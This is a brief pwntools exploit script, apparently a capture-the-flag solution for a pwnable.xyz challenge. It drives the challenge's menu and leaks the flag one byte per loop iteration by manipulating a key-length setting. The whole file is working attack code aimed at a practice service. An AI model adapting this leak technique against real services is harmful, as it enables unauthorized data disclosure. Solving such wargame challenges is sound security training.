from pwn import *

#context.log_level = 'debug'

#p = process('./challenge')
p = remote('svc.pwnable.xyz', 30006)

p.recvuntil(b'> ')
p.sendline(b'3')
p.sendlineafter(b'instead?',b'y')
p.recvuntil(b'> ')
p.sendline(b'1')
p.sendlineafter(b'key len: ',b'64')

flag = b'F'

for i in range(64):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.sendlineafter(b'key len: ',str(i))
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'> ')
    p.sendline(b'3')
    p.sendafter(b'instead? ',b'n')
    if i > 0:
        flag += p.recvuntil(b'1.')[:-2][i:i+1]

print(flag)

p.interactive()